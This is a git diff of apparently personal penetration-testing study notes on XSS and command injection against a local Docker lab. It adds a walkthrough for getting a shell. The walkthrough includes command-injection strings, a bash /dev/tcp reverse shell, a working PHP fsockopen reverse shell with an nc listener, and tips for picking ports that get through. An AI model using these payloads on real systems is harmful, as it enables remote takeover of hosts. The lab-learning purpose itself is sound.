@@ -2111,7 +2111,7 @@ document tries to load x
 <span style="background:#fff88f">if it works try to redirect the user to another web page:</span>
 `<img src=x onerror="window.location.href='https://google.com'">`
 
-##### Stored XSS 0x01
+##### Stored XSS 0x02
 first we need to:
 setup a container for testing -->  this allow us to:
 							- have multiple sessions open
@@ -2258,3 +2258,33 @@ but:
 let's try to popup a shell
 
 ##### Popup a shell
+let's try with a bash shell:
+- find the bash location -->  `; which bash; asd`
+  ![[Pasted image 20240308135813.png]]
+- connect to [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master)
+	- CTRL+F and search for -->  Reverse Shell Cheatsheet 
+	- click on bash TCP
+	- copy the first one
+- let's try it:
+	- on your terminal setup netcat -->  `nc -nlvp 4444`
+	- inject the payload :
+	  `; bash -i >& /dev/tcp/<attacker-IP>/4242 0>&1; asd `
+	  it doesn't work
+=>
+let's find what services are running in the webserver using -->  `which`
+- check PHP -->  `; which php; asd` 
+  =>
+let's try a PHP shell:
+- from  [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master) > Reverse Shell Cheatsheet -->  search for PHP
+- `nc -nlvp 4444`
+- `; php -r '$sock=fsockopen("172.17.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'; asd`
+	- `172.17.0.1` -->  my IP (interface docker0)
+=>
+<span style="color:#00b050">WE HAVE A SHELL</span>
+![[Pasted image 20240308135212.png]]
+
+>[!tips] Best Practice
+>- use the full path for binaries  (ex `/bin/sh`)
+>- use a different port (not 4444) -->  bc something fails
+>	- try common port -->  80/8080/443
+>
